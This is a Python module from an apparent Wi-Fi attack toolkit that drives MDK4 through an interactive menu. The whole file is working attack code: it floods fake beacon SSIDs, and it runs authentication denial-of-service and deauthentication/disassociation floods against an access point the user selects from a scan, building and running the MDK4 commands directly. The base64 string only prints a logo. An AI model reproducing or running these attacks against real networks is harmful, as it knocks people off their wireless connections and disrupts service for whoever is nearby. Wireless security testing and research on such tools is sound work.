#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   use_mdk.py - Use MDK4 to create a beacon flood, denial of service and more.
#    Copyright (C) 2018 Yudhajit N. (Sh3llcod3)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>
#   Contact: Please create a issue on my GitHub <https://github.com/Sh3llcod3>
#
#Import our custom modules
from modules import *
from .use_aircrack import *
#Create our 'mdk' class
class mdkObj(object):
    def __init__(self,colors):
        self.colors = colors
        self.mdkSource = "~/.airscriptNG/mdk/*/src/mdk4"
        self.lanListLocation = "scripts/ssid_lists/lan_list.txt"
        self.beaconListLocation = "scripts/ssid_lists/beacon_flood.txt"
        self.customListLocation = "scripts/ssid_lists/custom_list.txt"
    #Display the logo
    def showLogo(self):
        #This wasn't done by hand.
        #Some quick base64 + list comprehension + some print statements!
        mdkLogo = ("CuKWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDiloji"
        "lojilZcgIOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWXCuKWiOKWiOKWiOKWiOKVlyDi"
        "lojilojilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZEg4paI4paI"
        "4pWU4pWd4paI4paI4pWRICDilojilojilZEK4paI4paI4pWU4paI4paI4paI4paI4pWU4paI"
        "4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilZTilZ0g4paI4paI"
        "4paI4paI4paI4paI4paI4pWRCuKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKW"
        "iOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4paI4paI4pWXIOKVmuKVkOKVkOKVkOKV"
        "kOKWiOKWiOKVkQrilojilojilZEg4pWa4pWQ4pWdIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKW"
        "iOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWXICAgICDilojilojilZEK4pWa4pWQ4pWd"
        "ICAgICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDi"
        "lZ0gICAgIOKVmuKVkOKVnQo=")
        mdkLogo = b64D(mdkLogo)
        print(mdkLogo)
        startupInfo = returnGreenDeep(self.colors,"Developed by Sh3llCod3, Using MDK4 to create chaos. 2017-2018.")
        printInfo(self.colors,startupInfo)
    #Set the attack mode
    def selectAttackMode(self):
        COLOR = self.colors
        modeSupportedList = \
        [
            ["Authentication denial-of-service", self.authDenialOfService],
            ["Deauth-Disassoc denial-of-service", self.deauthDisassocFlood],
            ["Beacon Flood", self.standardBeaconFlood]
        ]
        supportedAttackModes, attackModeMap = createDictMap(modeSupportedList)
        #Select which type of attack is required.
        showDictList(supportedAttackModes, COLOR)
        lowerVal, higherVal = getDictRange(attackModeMap)
        callMDKFunction = attackModeMap[takeNumericInput(
            "Please enter an MDK4 attack mode.", 
            lowerVal,
            higherVal,
            COLOR)]
        clearTerm()
        callMDKFunction()
    #Add method for beacon flood
    def standardBeaconFlood(self):
        COLOR = self.colors
        availableLists = \
        [
            ["Use the Beacon Flood list (50 APs)", self.beaconListLocation],
            ["Use the LAN-puns list (20 APs)", self.lanListLocation],
            ["Use a custom list. Add entries in -> scripts/ssid_lists/custom_list.txt", self.customListLocation]
        ]
        availableListsDict, listLocationDict = createDictMap(availableLists)
        printBlue(COLOR, "Viewing available lists (all are SFW):")
        showDictList(availableListsDict, COLOR)
        lowerListVal, upperListVal = getDictRange(listLocationDict)
        while True:
            beaconFloodList = listLocationDict[takeNumericInput(
                "Please select your list of choice.",
                lowerListVal,
                upperListVal,
                COLOR)]
            if self.fileIsEmpty(beaconFloodList):
                createNewLine()
                printYellow(
                    COLOR,
                    "Error: Chosen list is empty. Add some entries to it!")
                createNewLine()
                continue
            else:
                break
        try:
            self.setCard(COLOR)
            printSuccess(COLOR, "You're all set.")
            printSuccess(COLOR, "You can press Ctrl+C to stop, anytime.\n")
            if yesNo("Start Beacon-Flood?", COLOR):
                mdkCommand = " {} b -f {} -t 0 -w a -m -c 6 -s 360".format(
                    self.mdkCardName,
                    beaconFloodList
                )
                bashRun(self.mdkSource + mdkCommand)
            else:
                raise ValueError
        except(KeyboardInterrupt, EOFError, ValueError):
            self.cleanupCard()
    #Add method for auth-DOS 
    def authDenialOfService(self):
        COLOR = self.colors
        try:
            createNewLine()
            printBlue(COLOR, "Welcome to the Auth-DOS function.")
            printBlue(COLOR, "Let's start by selecting a target network.")
            self.setCard(COLOR)
            self.getAccessPoints()
            targetMac = self.mdkTargetNetwork[1]
            mdkCommand = " {} a -a {} -m".format(
                self.mdkCardName,
                targetMac
            )
            createNewLine()
            if yesNo("Target Network: {}. Start Auth-DOS?".format(
                self.mdkTargetNetwork[7]
            ), COLOR):
                bashRun(self.mdkSource + mdkCommand)
            else:
                raise ValueError
        except(KeyboardInterrupt, EOFError, ValueError):
            self.cleanupCard()
            bashRun("rmdir HANDSHAKES 2>/dev/null")
    #Add method for deauth-disassoc
    def deauthDisassocFlood(self):
        COLOR = self.colors
        try:
            createNewLine()
            printBlue(COLOR, "Welcome to the Deauth-DOS function.")
            printBlue(COLOR, "Let's select a network to perform a DOS on.")
            self.setCard(COLOR)
            self.getAccessPoints()
            targetMac = self.mdkTargetNetwork[1]
            self.mdkBlacklist = ioStream("mktemp -u HANDSHAKES/MDK_TARGET_XXXXX")
            mdkCommand = " {} d -x -b {}".format(
                self.mdkCardName,
                self.mdkBlacklist
            )
            createNewLine()
            if yesNo("Target Network: {}. Start Deauth-Disassoc?".format(
                self.mdkTargetNetwork[7]
            ), COLOR):
                bashRun("echo \"{}\" > {} ".format(
                    targetMac,
                    self.mdkBlacklist
                ))
                bashRun(self.mdkSource + mdkCommand)
            else:
                raise ValueError
        except(KeyboardInterrupt, EOFError, ValueError):
            self.cleanupCard()
            if hasattr(self, 'mdkBlacklist'):
                bashRun("rm {}".format(self.mdkBlacklist))
            bashRun("rmdir HANDSHAKES 2>/dev/null")
    #Set the card in monitor mode for mdk
    def setCard(self, colorClass):
        self.mdkCard = aircrackObj(colorClass)
        self.mdkCard.selectInitialCard()
        self.mdkCardName = self.mdkCard.firstCard.cardName
    #Add method to cleanup once done.
    def cleanupCard(self):
        self.mdkCard.callCompleteCleanup()
    #Gather all the APs and select one.
    def getAccessPoints(self):
        self.mdkCard.createTempFiles()
        self.mdkCard.gatherInitialData()
        self.mdkCard.parseCsvData()
        totalAPCount = self.mdkCard.apList[-1][0]
        self.mdkTargetNetwork = self.mdkCard.apList[takeNumericInput(
            "Please select an AP for use with MDK4.",
            1,
            totalAPCount,
            self.colors
        ) - 1]
    #Check if file is empty
    def fileIsEmpty(self, inputFile):
        try:
            with open(inputFile, "r") as fileToCheck:
                fileToCheck = fileToCheck.read().rstrip()
            if fileToCheck is str():
                return True
            else:
                return False
        except(FileNotFoundError) as error:
            createNewLine()
            printYellow(
                self.colors,
                error
            )
            printYellow(
                self.colors, 
                "This is a bug! Report this at <https://github.com/Sh3llcod3>"
            )
            createNewLine()
            normalQuit(1)
